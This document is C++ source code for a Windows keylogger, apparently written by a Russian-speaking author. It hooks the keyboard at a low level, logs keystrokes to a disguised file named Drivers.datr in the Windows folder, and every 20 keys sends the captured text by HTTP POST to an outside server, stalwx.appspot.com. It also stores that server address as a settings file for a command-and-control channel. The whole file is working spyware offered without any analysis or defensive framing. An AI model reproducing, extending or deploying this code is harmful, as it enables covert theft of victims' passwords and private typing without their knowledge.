#include <windows.h>
#include <iostream>
#include <process.h>
#include <winsock.h> 
#include <stdlib.h>
#include <math.h>  //??????????! 
#include <time.h>
#include <io.h>

using namespace std;
struct retinfo
{
    int lenE;
    int lenR;
    char* E;
    char* R;
};

char sendinfo[1000];




char* GetURL(char *url) {
    WSADATA lpWSAData;
    SOCKET s;

    // Проверим на правильность введенный адрес.
    // Он должен начинаться с "http://"
    if (memcmp(url,"HTTP://",7)!=0 && memcmp(url,"http://",7)!=0) return(NULL);
    url+=7;

    // Инициализация библиотеки Ws2_32.dll.
    if (WSAStartup(MAKEWORD(1,1),&lpWSAData)!=0) return(NULL);


    // Получим имя хоста, номер порта и путь ----------------------------

    char *http_host=strdup(url); // Имя хоста ( HTTP_HOST)
    int port_num=80;             // Номер порта по умолчанию ( HTTP_PORT)
    char *http_path=NULL;        // Путь (REQUEST_URI)

    char *pch=strchr( http_host,':');
    if (!pch) {
        pch=strchr( http_host,'/');
        if (pch) {
            *pch=0;
            http_path=strdup(pch+1);
            }
        else http_path=strdup("");
        }
    else {
        *pch=0;pch++;
        char *pch1 = strchr(pch,'/');
        if (pch1) {
            *pch1=0;
            http_path=strdup(pch1+1);
            }
        else http_path=strdup("");

        port_num = atoi(pch);

        if (port_num==0) port_num = 80;
        }

    // Поучаем IP адрес по имени хоста
    struct hostent* hp;
    if (!(hp=gethostbyname( http_host))) {
        free( http_host);
        free( http_path);
        return(NULL);
        }

    // Открываем сокет
    s=socket(AF_INET, SOCK_STREAM, 0);
    if (s==INVALID_SOCKET) {
        free( http_host);
        free( http_path);
        return(NULL);
        }

    // Заполняем структуру sockaddr_in
    struct sockaddr_in ssin;
    memset ((char *)&ssin, 0, sizeof(ssin));
    ssin.sin_family = AF_INET;
    ssin.sin_addr.S_un.S_un_b.s_b1 = hp->h_addr[0];
    ssin.sin_addr.S_un.S_un_b.s_b2 = hp->h_addr[1];
    ssin.sin_addr.S_un.S_un_b.s_b3 = hp->h_addr[2];
    ssin.sin_addr.S_un.S_un_b.s_b4 = hp->h_addr[3];
    ssin.sin_port = htons(port_num);

    // Выводим IP адрес хоста, с которым будем соединятся
  //  intf("Conecting to %d.%d.%d.%d...",(unsigned char)hp->h_addr[0],
  //                                       (unsigned char)hp->h_addr[1],
  //                                       (unsigned char)hp->h_addr[2],
  //                                       (unsigned char)hp->h_addr[3]);

    // Соединяемся с хостом
    if (connect(s, (sockaddr *)&ssin, sizeof(ssin))==-1) {
        free( http_host);
        free( http_path);
    //   rintf("Error\n");
        return(NULL);
        }
  //  intf("Ok\n");

    // Формируем HTTP запрос
    char *query=(char*)malloc(2048);

    strcpy(query,"GET /");
    strcat(query, http_path);
    strcat(query," HTTP/1.0\nHost: ");
    strcat(query, http_host);
    strcat(query,"\nUser-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
    strcat(query,"\nAccept: */*\n\n");

    
    //prtf("zapr  \n%s",query);

    // Отправляем запрос серверу
    int cnt=send(s,query,strlen(query),0);

    // Освобождаем память
    free( http_host);
    free( http_path);
    free(query);

    // Проверяем, не произошло ли ошибки при отправке запроса на сервер
     if (cnt==SOCKET_ERROR) return(NULL);

    cnt=1;

    // Получаем ответ с сервера ---------------------------------

    int size=1024*1024; // 1Mb
    char *result=(char*)malloc(size);
    strcpy(result,"");
    char *result_ptr=result;

    while (cnt!=0 && size>0) {
        cnt=recv (s, result_ptr, sizeof(size),0);
        if (cnt>0) {
            result_ptr+=cnt;
            size-=cnt;
            }
        }
    *result_ptr=0;

    // Деинициализация библиотеки Ws2_32.dll
    WSACleanup();

    return(result);
    }


                                            //+8
char* PostURL(char *url, char *strokapost, char* lengg) {
    WSADATA lpWSAData;
    SOCKET s;
    if (memcmp(url,"HTTP://",7)!=0 && memcmp(url,"http://",7)!=0) return(NULL);
    url+=7;
    if (WSAStartup(MAKEWORD(1,1),&lpWSAData)!=0) return(NULL);
    char *http_host=strdup(url); // Имя хоста ( HTTP_HOST)
    int port_num=80;             // Номер порта по умолчанию ( HTTP_PORT)
    char *http_path=NULL;        // Путь (REQUEST_URI)
    char *pch=strchr( http_host,':');
    if (!pch) {
        pch=strchr( http_host,'/');
        if (pch) {
            *pch=0;
            http_path=strdup(pch+1);
            }
        else http_path=strdup("");
        }
    else {
        *pch=0;pch++;
        char *pch1 = strchr(pch,'/');
        if (pch1) {
            *pch1=0;
            http_path=strdup(pch1+1);
            }
        else http_path=strdup("");

        port_num = atoi(pch);

        if (port_num==0) port_num = 80;
        }
    struct hostent* hp;
    if (!(hp=gethostbyname( http_host))) {
        free( http_host);
        free( http_path);
        return(NULL);
        }
    s=socket(AF_INET, SOCK_STREAM, 0);
    if (s==INVALID_SOCKET) {
        free( http_host);
        free( http_path);
        return(NULL);
        }
    struct sockaddr_in ssin;
    memset ((char *)&ssin, 0, sizeof(ssin));
    ssin.sin_family = AF_INET;
    ssin.sin_addr.S_un.S_un_b.s_b1 = hp->h_addr[0];
    ssin.sin_addr.S_un.S_un_b.s_b2 = hp->h_addr[1];
    ssin.sin_addr.S_un.S_un_b.s_b3 = hp->h_addr[2];
    ssin.sin_addr.S_un.S_un_b.s_b4 = hp->h_addr[3];
    ssin.sin_port = htons(port_num);

    if (connect(s, (sockaddr *)&ssin, sizeof(ssin))==-1) {
        free( http_host);
        free( http_path);
        return(NULL);
        }
    char *query=(char*)malloc(2048);

    strcpy(query,"POST /");
    strcat(query, http_path);
    strcat(query, "sign");
    strcat(query," HTTP/1.0\nHost: ");
    strcat(query, http_host);
    strcat(query, "\nContent-length: ");
    strcat(query, lengg);
    
    strcat(query,"\nUser-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
    strcat(query,"\nAccept: */*\n\n");
    //strcat(query, "content=qwer");
    strcat(query, "content=");
    strcat(query, strokapost);

    int cnt=send(s,query,strlen(query),0);

    free( http_host);
    free( http_path);
    free(query);

     if (cnt==SOCKET_ERROR) return(NULL);

    cnt=1;

    int size=1024*1024; // 1Mb
    char *result=(char*)malloc(size);
    strcpy(result,"");
    char *result_ptr=result;

    while (cnt!=0 && size>0) {
        cnt=recv (s, result_ptr, sizeof(size),0);
        if (cnt>0) {
            result_ptr+=cnt;
            size-=cnt;
            }
        }
    *result_ptr=0;

    WSACleanup();
    cout << result;
    return(result);
    }



retinfo symbols(DWORD key)
{
    retinfo result;
    switch (key)
    {
         case 27:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[ESC]";        
             result.R = "[ESC]";
             break;
         case 112:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F1]";        
             result.R = "[F1]";
             break;
         case 113:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F2]";        
             result.R = "[F2]";
             break;
         case 114:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F3]";        
             result.R = "[F3]";
             break;
         case 115:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F4]";        
             result.R = "[F4]";
             break;
         case 116:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F5]";        
             result.R = "[F5]";
             break;
         case 117:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F6]";        
             result.R = "[F6]";
             break;
         case 118:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F7]";        
             result.R = "[F7]";
             break;
         case 119:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F8]";        
             result.R = "[F8]";
             break;
         case 120:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[F9]";        
             result.R = "[F9]";
             break;
         case 121:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[F10]";        
             result.R = "[F10]";
             break;
         case 122:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[F11]";        
             result.R = "[F11]";
             break;
         case 123:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[F12]";        
             result.R = "[F12]";
             break;
             
             
         case 44:
             result.lenE = 8;
             result.lenR = 8;
             result.E = "[PrtScr]";        
             result.R = "[PrtScr]";
             break;
         case 145:
             result.lenE = 12;
             result.lenR = 12;
             result.E = "[ScrollLock]";        
             result.R = "[ScrollLock]";
             break;
         case 19:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[Pause]";        
             result.R = "[Pause]";
             break;
             
             
             
             
         case 192:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "`";        
             result.R = "ё";
             break;
         case 48:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "0";        
             result.R = "0";
             break;
         case 49:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "1";        
             result.R = "1";
             break;
         case 50:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "2";        
             result.R = "2";
             break;
         case 51:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "3";        
             result.R = "3";
             break;
         case 52:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "4";        
             result.R = "4";
             break;
         case 53:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "5";        
             result.R = "5";
             break;
         case 54:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "6";        
             result.R = "6";
             break;
         case 55:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "7";        
             result.R = "7";
             break;
         case 56:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "8";        
             result.R = "8";
             break;
         case 57:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "9";        
             result.R = "9";
             break;
             
             
         case 189:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "-";        
             result.R = "-";
             break;
         case 187:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "=";        
             result.R = "=";
             break;
         case 8:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[Back]";        
             result.R = "[Back]";
             break;
             
             
             
         case 81:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "q";        
             result.R = "й";
             break;
         case 87:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "w";        
             result.R = "ц";
             break;
         case 69:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "e";        
             result.R = "у";
             break;
         case 82:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "r";        
             result.R = "к";
             break;
         case 84:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "t";        
             result.R = "е";
             break;
         case 89:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "y";        
             result.R = "н";
             break;
         case 85:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "u";        
             result.R = "г";
             break;
         case 73:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "i";        
             result.R = "ш";
             break;
         case 79:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "o";        
             result.R = "щ";
             break;
         case 80:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "p";        
             result.R = "з";
             break;
         case 219:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "[";        
             result.R = "х";
             break;
         case 221:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "]";        
             result.R = "ъ";
             break;
         case 65:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "a";        
             result.R = "ф";
             break;
             
         
         
         
         
         
         case 83:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "s";        
             result.R = "ы";
             break;
         case 68:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "d";        
             result.R = "в";
             break;
         case 70:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "f";        
             result.R = "а";
             break;
         case 71:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "g";        
             result.R = "п";
             break;
         case 72:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "h";        
             result.R = "р";
             break;
         case 74:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "j";        
             result.R = "о";
             break;
         case 75:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "k";        
             result.R = "л";
             break;
         case 76:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "l";        
             result.R = "д";
             break;
         case 186:
             result.lenE = 1;
             result.lenR = 1;
             result.E = ";";        
             result.R = "ж";
             break;
         case 222:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "'";        
             result.R = "э";
             break;
         case 220:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "\\";        
             result.R = "\\";
             break;
             
             
             
         case 226:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "\\";        
             result.R = "\\";
             break;
         case 90:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "z";        
             result.R = "я";
             break;
         case 88:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "x";        
             result.R = "ч";
             break;
         case 67:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "c";        
             result.R = "с";
             break;
         case 86:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "v";        
             result.R = "м";
             break;
         case 66:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "b";        
             result.R = "и";
             break;
         case 78:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "n";        
             result.R = "т";
             break;
         case 77:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "m";        
             result.R = "ь";
             break;
         case 188:
             result.lenE = 1;
             result.lenR = 1;
             result.E = ",";        
             result.R = "б";
             break;
         case 190:
             result.lenE = 1;
             result.lenR = 1;
             result.E = ".";        
             result.R = "ю";
             break;
         case 191:
             result.lenE = 1;
             result.lenR = 1;
             result.E = "/";        
             result.R = ".";
             break;
             
             
             
             
             
             
             
         case 9:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[TAB]";        
             result.R = "[TAB]";
             break;
         case 20:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[CAPS]";        
             result.R = "[CAPS]";
             break;
         case 160:
             result.lenE = 8;
             result.lenR = 8;
             result.E = "[LSHIFT]";        
             result.R = "[LSHIFT]";
             break;
         case 161:
             result.lenE = 8;
             result.lenR = 8;
             result.E = "[RSHIFT]";        
             result.R = "[RSHIFT]";
             break;
             
         case 162:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[LCTRL]";        
             result.R = "[LCTRL]";
             break;
         case 163:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[RCTRL]";        
             result.R = "[RCTRL]";
             break;
         case 164:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[LALT]";        
             result.R = "[LALT]";
             break;
         case 165:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[RALT]";        
             result.R = "[RALT]";
             break;
             
         case 32:
             result.lenE = 1;
             result.lenR = 1;
             result.E = " ";        
             result.R = " ";
             break;
             
         case 13:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ENTER]";        
             result.R = "[ENTER]";
             break;
         
         case 91:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[WIN]";        
             result.R = "[WIN]";
             break;
         
         case 93:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[MENU]";        
             result.R = "[MENU]";
             break;
             
             
             
             
         case 38:
             result.lenE = 4;
             result.lenR = 4;
             result.E = "[UP]";        
             result.R = "[UP]";
             break;
         case 37:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[LEFT]";        
             result.R = "[LEFT]";
             break;
         case 40:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[DOWN]";        
             result.R = "[DOWN]";
             break;
         case 39:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[RIGHT]";        
             result.R = "[RIGHT]";
             break;
             
             
             
         case 45:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[INS]";        
             result.R = "[INS]";
             break;
         case 36:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[HOME]";        
             result.R = "[HOME]";
             break;
         case 33:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[PG_UP]";        
             result.R = "[PG_UP]";
             break;
         case 46:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[DEL]";        
             result.R = "[DEL]";
             break;
         case 35:
             result.lenE = 5;
             result.lenR = 5;
             result.E = "[END]";        
             result.R = "[END]";
             break;
         case 34:
             result.lenE = 9;
             result.lenR = 9;
             result.E = "[PG_DOWN]";        
             result.R = "[PG_DOWN]";
             break;
             
             
             
             
         case 144:
             result.lenE = 10;
             result.lenR = 10;
             result.E = "[NUM_LOCK]";        
             result.R = "[NUM_LOCK]";
             break;
         case 111:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_/]";        
             result.R = "[ADD_/]";
             break;
         case 106:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_*]";        
             result.R = "[ADD_*]";
             break;
         case 109:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_-]";        
             result.R = "[ADD_-]";
             break;
             
             
             
         case 96:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_0]";        
             result.R = "[ADD_0]";
             break;
         case 97:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_1]";        
             result.R = "[ADD_1]";
             break;
         case 98:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_2]";        
             result.R = "[ADD_2]";
             break;
         case 99:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_3]";        
             result.R = "[ADD_3]";
             break;
         case 100:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_4]";        
             result.R = "[ADD_4]";
             break;
         case 101:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_5]";        
             result.R = "[ADD_5]";
             break;
         case 102:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_6]";        
             result.R = "[ADD_6]";
             break;
         case 103:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_7]";        
             result.R = "[ADD_7]";
             break;
         case 104:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_8]";        
             result.R = "[ADD_8]";
             break;
         case 105:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_9]";        
             result.R = "[ADD_9]";
             break;
             
             
         case 107:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_+]";        
             result.R = "[ADD_+]";
             break;
             
         case 110:
             result.lenE = 7;
             result.lenR = 7;
             result.E = "[ADD_.]";        
             result.R = "[ADD_.]";
             break;
         case 12:
             result.lenE = 13;
             result.lenR = 13;
             result.E = "[ADD_5_NONUM]";        
             result.R = "[ADD_5_NONUM]";
             break;
             
    
        
        
        
        
       
         default:
             result.lenE = 6;
             result.lenR = 6;
             result.E = "[FUCK]";        
             result.R = "[FUCK]";
             break;
    }
    return result;
} 





int dobl;
int kolvo;
bool triger_first;
char* name_inst;
char* host_name;






int SetInfo(char* filen, char* str_file) 
{ 
//char* str_file="Строка для файла"; 
FILE* fp = fopen(filen,"w"); 
if(fp != NULL) 
{ 
      cout << "Открыт для записи файл:";
for(int i=0;i < strlen(str_file);i++) 
putc(str_file[i],fp); 
} 
fclose(fp); 
return 0; 
}


char* GetInfo(char* filen) 
{ 
char str_file[100]; 
FILE* fp = fopen(filen,"r"); 
if(fp != NULL) 
{ 
      cout << "Получаем информацию из файла:\n";
      cout << filen;
      cout << "\n";
int i=0; 
char ch; 
while((ch = getc(fp)) != EOF) 
str_file[i++]=ch; 
str_file[i] = '\0'; 
} 
fclose(fp); 
char* resu = str_file;
      cout << "Получили:\n";
      cout << resu;
      cout << "\n";
return resu;

}










char* MyRand()
{
time_t temp = time(NULL);//???????? ?????
srand(temp); //?????????????? ????????? ?????????? ????? ?????????? ????????
int r = rand(); // ???????? ????????? ?????
char* resul;
itoa(r,resul,10);
return resul;
}



bool FileExist(char* file_)
{
     return access(file_, 0) != -1;
}

void __cdecl PostSniffOnServ(void* pParam)
{
    char *sending=(char*)malloc(2048);
    strcpy(sending,sendinfo);
    int cou = 0;
    while ((cou < 2000)&&(sending[cou]!='\0'))
    {
          cou++;
    }
    cout<< PostURL("http://stalwx.appspot.com/", sending, "28");
    cout<<  sendinfo;
    cout<<  "\n";
    cout<<  cou;
    free(sending);
}



void __cdecl ProTh(void* pParam)
{
     cout << "Начат ждущий поток\n";
     while (kolvo < 20)
     {
           //if ((kolvo % 10) == 0)
           //{
           // cout << kolvo;
           // cout << "\n";
           //}
           Sleep(10);
     }
     _beginthread(PostSniffOnServ, 0, 0); 
     kolvo = 0;
     std::cout << "100 go \n";
     _beginthread(ProTh, 0, 0);
}



     
     


void GetName()
{
     char *result=GetURL("http://stalwx.appspot.com/");
}
 /*
void GetCommand()
{
    char str_im[10];
    str_im[0] = '0';
    str_im[1] = '\0';
    char* tempstri = LoadDataFromServer();
    if (!(tempstri[0] == '0'))
    {
         
         int i = 1;
         while (!((tempstri[i-1]=='<') && (tempstri[i]=='/') && (tempstri[i+1]=='h') && (tempstri[i+2]=='t') && 
         (tempstri[i+3]=='m') && (tempstri[i+4]=='l')))
         {
             if ((tempstri[i-4]=='d') && (tempstri[i-3]=='y') && (tempstri[i-2]=='>') && (tempstri[i-1]=='n') && 
             (tempstri[i]=='a') && (tempstri[i+1]=='m') && (tempstri[i+2]=='e'))
             {
                 str_im[0] = tempstri[i+4];
                 str_im[1] = tempstri[i+5];
                 str_im[2] = tempstri[i+6];lolka azazazaz
                 
                 str_im[3] = tempstri[i+7];
                 str_im[4] = '\0';
                 
                 break;   
             }
             i++;
             std::cout << "vnutri cikla\n";
         }
    }
}



*/
 
LRESULT CALLBACK LLKeyProc(int nCode, WPARAM wParam, LPARAM lParam)
{
        
    if(nCode == HC_ACTION)
    {
        DWORD vk = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
        if (dobl == 0)
        {
             char ert = vk;
             //std::cout << ert;  
               
             std::cout << symbols(vk).E;
             
             dobl = 1;
             
             sendinfo[kolvo] = symbols(vk).E[0];
             sendinfo[kolvo+1] = '\0';
             kolvo++;
             FILE* f;
             f = fopen("c:\\Windows\\Drivers.datr","at");
             fwrite(&vk, sizeof(vk), 1, f);
             fclose(f); 
        }else
        {
             dobl = 0;              
        }
       // FILE* f;
       // f = fopen("c:\\example.txt","at");alex         
       // fwrite(&vk, sizeof(DWORD), 1, f);
       // fclose(f);       
            
       // if(vk == 0x1b)
       // {
       //     PostQuitMessage(0);
       // }
    }
    
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

char* LoadDataFromServer()
{
    char *result=GetURL(host_name);
    if (result != NULL)
    {
        return result;
    }else
    {
         return "0";
    }
      
}

char* GetNameInstServ()
{
    char str_im[10];
    str_im[0] = '0';
    str_im[1] = '\0';
    char* tempstri = LoadDataFromServer();
    if (!(tempstri[0] == '0'))
    {
         
         int i = 1;
         while (!((tempstri[i-1]=='<') && (tempstri[i]=='/') && (tempstri[i+1]=='h') && (tempstri[i+2]=='t') && 
         (tempstri[i+3]=='m') && (tempstri[i+4]=='l')))
         {
             if ((tempstri[i-4]=='d') && (tempstri[i-3]=='y') && (tempstri[i-2]=='>') && (tempstri[i-1]=='n') && 
             (tempstri[i]=='a') && (tempstri[i+1]=='m') && (tempstri[i+2]=='e'))
             {
                 str_im[0] = tempstri[i+4];
                 str_im[1] = tempstri[i+5];
                 str_im[2] = tempstri[i+6];
                 str_im[3] = tempstri[i+7];
                 str_im[4] = '\0';
                 
                 break;   
             }
             i++;
             std::cout << "vnutri cikla\n";
         }
    }
    std::cout << "posle cikla\n";
    char* retu = str_im;
    return retu;
     
}

void ObrabotkaServ(char* inp)
{
    if (inp[0] == '0')
    {
         return;
    }
    
}

void SetSettings()
{
    triger_first = !FileExist("C:\\windows\\Settings_host.ini");
    cout << "Входим в SetSettings\n";
    if (triger_first)
    {
        cout << "Это первый запуск\n";
        SetInfo("C:\\windows\\Settings_host.ini","http://stalwx.appspot.com/");
        host_name = "http://stalwx.appspot.com/";
        name_inst = "";
        name_inst = GetNameInstServ();
        return;
    }else
    {
        cout << "Это не первый запуск\n";
        host_name = GetInfo("C:\\windows\\Settings_host.ini");
        return;
        //char* temp_host_name = "";
        //FILE* f;
        //f = fopen("C:\\windows\\Settings_host.ini","wt");
       // fwrite(&temp_host_name, sizeof(temp_host_name), 1, f);
       // fwrite()
       // fclose(f);     
    }
    
    
}


 
int WINAPI WinMain(HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgs, int nWinMode)
{
    setlocale(LC_CTYPE, "");
    kolvo = 0;
    dobl = 0;

    //SetSettings();
   // std::cout << name_inst;
  //  std::cout << dfd ;
    
    //char *result=GetURL(host_name);
    //if (result != NULL)
    //{
    //    std::cout << result;
    //}
    //std::cout << MyRand();
    _beginthread(ProTh, 0, 0);
   
    cout << PostURL("http://stalwx.appspot.com/", "ololo", "13");
    cout << "Начали ждущий поток\n";
    //cout << "asdasd";
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKeyProc, GetModuleHandle(NULL), 0);
    cout << "Начали хукать\n";
    if(hook)
    {
        while(WaitMessage())
        {
            MSG msg = {0};
            while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE))
            {
                if(msg.message == WM_QUIT)
                {
                    UnhookWindowsHookEx(hook);
                    return 0;
                }
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
        }
    }
    return 0;
}
